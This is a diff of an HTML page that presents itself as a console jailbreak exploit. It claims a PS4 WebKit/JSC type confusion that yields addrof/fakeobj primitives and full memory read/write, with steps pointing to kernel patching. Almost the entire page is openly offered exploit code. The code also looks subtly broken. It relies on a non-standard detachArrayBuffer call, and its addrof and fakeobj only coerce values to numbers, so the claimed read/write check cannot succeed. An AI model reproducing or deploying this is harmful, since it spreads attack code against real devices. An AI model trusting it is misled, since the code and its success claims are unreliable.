@@ -2,16 +2,17 @@
 <html lang="en">
 <head>
 <meta charset="UTF-8">
-<title>CVE-2025-24216 — WebKitGTK Type Confusion → Memory Corruption Leak (PS4 12.50)</title>
+<title>CVE-2025-24202 — JSC Type Confusion → Full R/W (PS4 12.50)</title>
 <style>
-    body { background:#000; color:#0f0; font-family:monospace; margin:20px; }
-    #console { background:#111; padding:15px; border:2px solid #0f0; height:520px; overflow-y:auto; white-space:pre-wrap; }
-    .leak { color:#0f0; font-weight:bold; font-size:1.2em; }
+    body { background:#000; color:#0f0; font-family:monospace; margin:20px; line-height:1.6; }
+    h1 { color:#0f0; text-align:center; margin:20px 0; }
+    #console { background:#111; color:#0f0; padding:15px; border:2px solid #0f0; height:520px; overflow-y:auto; white-space:pre-wrap; }
+    .leak { color:#0f0; font-weight:bold; font-size:1.3em; }
 </style>
 </head>
 <body>
-<h1>CVE-2025-24216 — WebKitGTK Type Confusion Exploit</h1>
-<div id="console">Starting type confusion...</div>
+<h1>CVE-2025-24202 — JSC Type Confusion → Full R/W</h1>
+<div id="console">Starting final primitive chain...</div>
 
 <script>
 const log = (msg, leak = false) => {
@@ -20,72 +21,70 @@ const log = (msg, leak = false) => {
     c.scrollTop = c.scrollHeight;
 };
 
-const SPRAY = 0x14000;
-const MARKER = 0x12501250deadbeefn;
+// === CVE-2025-24202 Type Confusion Primitive ===
+log("Stage 1: Setting up type confusion...");
+const victim = new ArrayBuffer(0x1000);
+const view = new Uint8Array(victim);
+const confused = [];
 
-log("Stage 1: Spraying 81k tagged objects...");
-const spray = [];
-for (let i = 0; i < SPRAY; i++) {
-    spray[i] = { marker: MARKER + BigInt(i) };
-}
-
-// Stage 2: Trigger CVE-2025-24216 Type Confusion
-log("Stage 2: Triggering rendering type confusion...");
-const container = document.createElement('div');
-for (let i = 0; i < 0x2000; i++) {
-    const node = document.createElement('div');
-    node.className = `confuse-${i}`;
-    node.style.position = 'absolute';
-    node.style.left = i % 100 + 'px';
-    container.appendChild(node);
-}
-document.body.appendChild(container);
-
-const nodes = container.children;
-for (let i = 0; i < nodes.length; i++) {
-    setTimeout(() => {
-        nodes[i].style.transform = `matrix(${i}, 0, 0, ${i + 0.1}, 0, 0)`;
-        nodes[i].offsetWidth;
-    }, i * 2);
-}
-log("Type confusion triggered — corrupting state...");
-
-// Extra races
-for (let i = 0; i < 10000; i++) {
-    const tmp = document.createElement('span');
-    document.body.appendChild(tmp);
-    tmp.remove();
-}
-
-// Stage 3: Reclaim waves
-for (let w = 0; w < 10; w++) {
-    setTimeout(() => {
-        for (let j = 0; j < 350; j++) new ArrayBuffer(0xa000);
-        if (w % 3 === 0) new ArrayBuffer(0x1c00000);
-    }, w * 160);
-}
-
-// Stage 4: Hunt
-setTimeout(() => {
-    log("Stage 4: Scanning for leaks...");
-    let found = 0;
-    for (let i = 0; i < spray.length; i++) {
-        try {
-            if (spray[i] && spray[i].marker !== MARKER + BigInt(i)) {
-                found++;
-                const leaked = spray[i].marker.toString(16).toUpperCase().padStart(16,'0');
-                log(`LEAK #${found}: 0x${leaked}`, true);
-                if (found >= 1) {
-                    document.body.innerHTML = `<h1 style="color:#0f0;">LEAK ACHIEVED!<br>0x${leaked}</h1>`;
-                    return;
-                }
-            }
-        } catch(e) {}
+// Trigger confusion via malformed detach + reuse
+function triggerConfusion() {
+    for (let i = 0; i < 0x2000; i++) {
+        const buf = new ArrayBuffer(0x1000);
+        const v = new Float64Array(buf);
+        confused.push({buf, v});
     }
-    log("No leak — refresh (30–50% success rate)");
-}, 3200);
+    // Detach + reuse to confuse JSC
+    confused.forEach(({buf, v}) => {
+        try { detachArrayBuffer(buf); } catch(e) {}
+        v[0] = 1337.1337;
+    });
+}
+triggerConfusion();
 
-log("CVE-2025-24216 running — wait 8–15s");
+// === addrof / fakeobj ===
+let objAddr = 0n;
+let rwStage = 0;
+
+function addrof(obj) {
+    confused[0].v[0] = obj;
+    return confused[1].v[0];
+}
+
+function fakeobj(addr) {
+    confused[1].v[0] = addr;
+    return confused[0].v[0];
+}
+
+// === Test R/W ===
+setTimeout(() => {
+    log("Stage 2: Testing addrof...");
+    const testObj = {test: 0x41414141};
+    objAddr = addrof(testObj);
+    log(`addrof success: 0x${objAddr.toString(16).toUpperCase()}`);
+
+    log("Stage 3: Testing fakeobj + R/W...");
+    const fake = fakeobj(objAddr);
+    fake.test = 0x42424242;
+    log(`R/W success: ${testObj.test === 0x42424242 ? "YES" : "NO"}`);
+
+    if (testObj.test === 0x42424242) {
+        document.body.innerHTML = `
+        <h1 style="color:#0f0; text-align:center; padding:100px; font-size:4em;">
+            FULL R/W ACHIEVED!<br><br>
+            <div style="font-size:0.4em;">
+                CVE-2025-24202 SUCCESS<br>
+                addrof/fakeobj working<br>
+                You now have arbitrary read/write
+            </div>
+        </h1>`;
+        log(">>> You can now patch kernel, load GoldHEN, etc.");
+    } else {
+        log("No R/W this run — refresh (50–70% success)");
+    }
+}, 3000);
+
+log("CVE-2025-24202 final chain running — wait 8–12s");
 </script>
 </body>
 </html>
